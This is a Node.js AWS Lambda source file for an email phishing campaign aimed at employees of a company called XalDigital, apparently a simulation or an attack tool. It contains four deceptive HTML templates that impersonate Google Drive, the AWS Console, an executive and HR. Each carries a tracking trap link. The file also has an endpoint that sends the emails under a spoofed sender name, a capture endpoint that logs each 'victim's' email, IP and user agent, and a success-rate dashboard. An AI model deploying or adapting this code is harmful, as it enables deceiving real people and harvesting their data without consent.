import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import pkg from 'pg';
const { Pool } = pkg;

dotenv.config();

// Arrays en memoria para logs
// let campaignsLog = [];
// let victimsLog = [];

// Configuración SMTP
const smtpConfig = {
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT),
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
};

const pool = new Pool({
  host: process.env.DB_HOST,
  port: process.env.DB_PORT,
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
});

const transporter = nodemailer.createTransport(smtpConfig);

// Plantillas de correo
const plantillas = {
  drive: {
    asunto: 'XD | Acción Requerida: Registro de Documento Compartido - XalDigital',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #4285f4; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>Google Drive</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>
          <p>Hola ${nombreObjetivo},</p>

          <p>Espero que te encuentres muy bien.</p>

          <p>
            Como parte de la planeación anual de XalDigital, 
            ${remitenteFalso} te compartió un documento para su <strong>registro y seguimiento interno</strong>.
            Es algo rutinario, nada fuera de lo normal.
          </p>

          <div style='background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);'>
            <p style='margin: 0; color: #666;'>📄 <strong>Reporte_Confidencial_Q4_2024.pdf</strong></p>
            <p style='margin: 10px 0 0 0; color: #999; font-size: 12px;'>Compartido hace unos minutos</p>
          </div>

          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #4285f4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Abrir Documento</a>
          </div>

          <p style='color: #999; font-size: 11px; margin-top: 30px;'>
            Si ya registraste este documento anteriormente, puedes ignorar este mensaje.
          </p>
        </div>
      </div>
    `
  },

  aws: {
    asunto: 'XD | Acción Requerida: Registro de Actividad en AWS - XalDigital',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #232f3e; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>AWS Console</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>
          <p>Hola ${nombreObjetivo},</p>

          <p>Espero que te encuentres muy bien.</p>

          <p>
            Como parte de la planeación anual de XalDigital, necesitamos que revises 
            una actividad registrada en tu cuenta AWS.  
            Es simplemente una verificación rutinaria, como las que hacemos cada fin de año.
          </p>

          <div style='background: #fff3cd; padding: 15px; margin: 20px 0; border-left: 4px solid #ffc107;'>
            <p style='margin: 0; color: #856404;'><strong>⚠️ Acción requerida</strong></p>
            <p style='margin: 10px 0 0; color: #856404;'>Por favor confirma tu acceso para continuar con el registro anual.</p>
          </div>

          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #232f3e; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Verificar Acceso</a>
          </div>

          <p style='color: #666; font-size: 13px;'>Saludos,<br><strong>${remitenteFalso}</strong><br>XalDigital</p>
        </div>
      </div>
    `
  },

  ceo: {
    asunto: 'XD | Acción Requerida: Registro de Actualización Interna - XalDigital',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 2px solid #d32f2f;'>
        <div style='background: #d32f2f; padding: 15px;'>
          <h2 style='color: white; margin: 0;'>⚠️ Acción Requerida</h2>
        </div>
        <div style='padding: 30px; background: white;'>
          <p>Hola ${nombreObjetivo},</p>

          <p>
            Espero que estés muy bien.  
            Como parte de la planeación anual de XalDigital, estamos actualizando varias credenciales internas 
            y necesitamos tu registro para continuar con el proceso.
          </p>

          <p>
            Es algo común que hacemos cada cierre de año, solo necesitamos que valides tu información.
          </p>

          <div style='background: #fff3cd; padding: 15px; margin: 20px 0; border-left: 4px solid #ffc107;'>
            <p style='margin: 0; color: #856404;'><strong>⏰ Tiempo estimado: 1 minuto</strong></p>
            <p style='margin: 10px 0 0; color: #856404;'>Por favor completa el registro cuanto antes.</p>
          </div>

          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #d32f2f; color: white; padding: 15px 40px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Completar Registro</a>
          </div>

          <p style='color: #666; font-size: 13px;'>Saludos,<br><strong>${remitenteFalso}</strong><br>XalDigital</p>
        </div>
      </div>
    `
  },

  rh: {
    asunto: 'XD | Acción Requerida: Registro de Vacaciones Navideñas 2025 - XalDigital',
    cuerpo: (nombreObjetivo, remitenteFalso, urlTrampa) => `
      <div style='font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;'>
        <div style='background: #2e7d32; padding: 20px; text-align: center;'>
          <h2 style='color: white; margin: 0;'>Recursos Humanos - XalDigital</h2>
        </div>
        <div style='padding: 30px; background: #f5f5f5;'>

          <p>Hola ${nombreObjetivo},</p>

          <p>Espero que te encuentres muy bien.</p>

          <p>
            Como parte de la planeación anual de XalDigital, ya estamos organizando el 
            <strong>registro de vacaciones navideñas 2025</strong>.
            Necesitamos que ingreses al sistema y completes tu información para poder avanzar con la planificación.
          </p>

          <div style='background: white; padding: 20px; margin: 20px 0; border-radius: 8px; text-align: center;'>
            <p style='font-size: 20px; color: #2e7d32; margin: 10px 0;'><strong>🎄 Registro de Vacaciones Navideñas</strong></p>
            <p style='color: #666;'>Solo te tomará un momento.</p>
          </div>

          <div style='text-align: center; margin: 30px 0;'>
            <a href='${urlTrampa}' style='background: #2e7d32; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold;'>Completar Registro</a>
          </div>

          <p style='color: #666; font-size: 13px;'>
            Departamento de Recursos Humanos<br><strong>${remitenteFalso}</strong>
          </p>
        </div>
      </div>
    `
  }
};


// Función para registrar logs
async function registrarLog(tipo, datos) {
  const id = `${tipo}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

  if (tipo === 'ENVIADO') {
    await pool.query(
      'INSERT INTO email_campaigns (id, destinatario, remitente_falso, tipo_plantilla) VALUES ($1, $2, $3, $4)',
      [id, datos.destinatario, datos.remitenteFalso, datos.tipoPlantilla]
    );
  } else {
    await pool.query(
      'INSERT INTO victims_captured (id, email, ip_address, user_agent, plantilla) VALUES ($1, $2, $3, $4, $5)',
      [id, datos.email, datos.ip, datos.userAgent, datos.plantilla]
    );
  }
}


// Handler principal
export const handler = async (event, context) => {
  console.log('Event:', JSON.stringify(event, null, 2));

  const method = event.requestContext.http.method;
  const path = event.rawPath;

  // Headers CORS
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  // Manejar OPTIONS (CORS preflight)
  if (method === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: ''
    };
  }

  try {
    // Parsear body si existe
    let body = {};
    if (event.body) {
      body = JSON.parse(event.body);
    }

    // Routing manual
    if (method === 'POST' && (path === '/api/send-phishing' || path === '/prod/api/send-phishing')) {
      return await handleSendPhishing(body, corsHeaders);
    }

    if (method === 'POST' && (path === '/api/capture' || path === '/prod/api/capture')) {
      return await handleCapture(body, corsHeaders, event);
    }

    if (method === 'GET' && (path === '/api/stats' || path === '/prod/api/stats')) {
      return await handleStats(corsHeaders);
    }

    // Agregar esta ruta en el routing manual del handler:
    if (method === 'GET' && (path === '/api/test-db' || path === '/prod/api/test-db')) {
      return await handleTestDB(corsHeaders);
    }


    // Ruta no encontrada
    return {
      statusCode: 404,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Ruta no encontrada' })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Error interno del servidor' })
    };
  }
};

// Handler para enviar phishing
async function handleSendPhishing(body, corsHeaders) {
  const { destinatario, nombreObjetivo, remitenteFalso, asunto, tipoPlantilla } = body;

  // Validar datos
  if (!destinatario || !nombreObjetivo || !remitenteFalso || !tipoPlantilla) {
    return {
      statusCode: 400,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Faltan campos requeridos' })
    };
  }

  // URLs de captura
  const rutasCreibles = {
    drive: `/drive/share/document?id=${Buffer.from(destinatario).toString('base64')}&access=view`,
    aws: `/console/signin?redirect=${Buffer.from(destinatario).toString('base64')}&region=us-east-1`,
    ceo: `/security/verify-account?token=${Buffer.from(destinatario).toString('base64')}&urgent=true`,
    rh: `/portal/rh/bonos?employee=${Buffer.from(destinatario).toString('base64')}&year=2024`
  };

  const urlTrampa = `${process.env.BASE_URL}${rutasCreibles[tipoPlantilla]}&type=${tipoPlantilla}`;

  // Obtener plantilla
  const plantilla = plantillas[tipoPlantilla];
  if (!plantilla) {
    return {
      statusCode: 400,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Tipo de plantilla inválido' })
    };
  }

  // Configurar correo
  const mailOptions = {
    from: `"${remitenteFalso}" <${smtpConfig.auth.user}>`,
    to: destinatario,
    subject: asunto || plantilla.asunto,
    html: plantilla.cuerpo(nombreObjetivo, remitenteFalso, urlTrampa)
  };

  try {
    // Enviar correo
    await transporter.sendMail(mailOptions);

    // Registrar envío
    await registrarLog('ENVIADO', {
      destinatario,
      remitenteFalso,
      tipoPlantilla
    });

    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify({
        success: true,
        message: `✅ Correo enviado exitosamente a: ${destinatario}`
      })
    };
  } catch (error) {
    console.error('Error enviando correo:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({
        error: '❌ Error al enviar el correo. Verifica la configuración SMTP.'
      })
    };
  }
}

// Handler para capturar víctimas
async function handleCapture(body, corsHeaders, event) {
  const { email, userAgent, plantilla } = body;
  
  // Obtener IP real del evento de Lambda
  const realIP = event.requestContext?.http?.sourceIp || 
                 event.headers?.['x-forwarded-for']?.split(',')[0] || 
                 event.headers?.['x-real-ip'] || 
                 'Unknown IP';

  console.log('🌐 IP capturada:', realIP);

  await registrarLog('CAPTURADO', {
    email,
    ip: realIP,
    userAgent,
    plantilla
  });

  return {
    statusCode: 200,
    headers: corsHeaders,
    body: JSON.stringify({ success: true })
  };
}

// Handler para estadísticas
// Handler para estadísticas
async function handleStats(corsHeaders) {
  try {
    const campaignsResult = await pool.query('SELECT COUNT(*) FROM email_campaigns');
    const victimsResult = await pool.query('SELECT COUNT(*) FROM victims_captured');

    const enviados = parseInt(campaignsResult.rows[0].count);
    const capturados = parseInt(victimsResult.rows[0].count);
    const efectividad = enviados > 0 ? ((capturados / enviados) * 100).toFixed(1) : 0;

    const campaigns = await pool.query('SELECT * FROM email_campaigns ORDER BY timestamp DESC');
    const victims = await pool.query('SELECT * FROM victims_captured ORDER BY timestamp DESC');

    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify({
        enviados,
        capturados,
        efectividad: `${efectividad}%`,
        campaigns: campaigns.rows,
        victims: victims.rows
      })
    };
  } catch (error) {
    console.error('Error obteniendo estadísticas:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({ error: 'Error obteniendo estadísticas' })
    };
  }
}

// Handler para test de base de datos
async function handleTestDB(corsHeaders) {
  try {
    console.log('🔍 Iniciando test de base de datos...');
    
    // Test 1: Conexión básica
    const connectionTest = await pool.query('SELECT NOW() as current_time');
    console.log('✅ Conexión exitosa:', connectionTest.rows[0]);
    
    // Test 2: Verificar tablas
    const tablesTest = await pool.query(`
      SELECT table_name 
      FROM information_schema.tables 
      WHERE table_schema = 'public'
    `);
    console.log('📋 Tablas encontradas:', tablesTest.rows);
    
    // Test 3: Insertar datos de prueba
    const testId = `TEST-${Date.now()}`;
    await pool.query(
      'INSERT INTO email_campaigns (id, destinatario, remitente_falso, tipo_plantilla) VALUES ($1, $2, $3, $4)',
      [testId, 'test@example.com', 'Test Sender', 'drive']
    );
    console.log('✅ Inserción de campaña exitosa');
    
    await pool.query(
      'INSERT INTO victims_captured (id, email, ip_address, user_agent, plantilla) VALUES ($1, $2, $3, $4, $5)',
      [`VICTIM-${Date.now()}`, 'victim@example.com', '192.168.1.1', 'Test Browser', 'aws']
    );
    console.log('✅ Inserción de víctima exitosa');
    
    // Test 4: Leer datos
    const campaignsCount = await pool.query('SELECT COUNT(*) FROM email_campaigns');
    const victimsCount = await pool.query('SELECT COUNT(*) FROM victims_captured');
    
    const result = {
      status: 'SUCCESS',
      timestamp: new Date().toISOString(),
      connection: 'OK',
      tables: tablesTest.rows.map(r => r.table_name),
      data: {
        campaigns: parseInt(campaignsCount.rows[0].count),
        victims: parseInt(victimsCount.rows[0].count)
      },
      test_operations: {
        insert_campaign: 'OK',
        insert_victim: 'OK',
        read_counts: 'OK'
      }
    };
    
    console.log('🎉 Test completado exitosamente:', result);
    
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify(result, null, 2)
    };
    
  } catch (error) {
    console.error('❌ Error en test de base de datos:', error);
    
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: JSON.stringify({
        status: 'ERROR',
        timestamp: new Date().toISOString(),
        error: error.message,
        stack: error.stack
      }, null, 2)
    };
  }
}
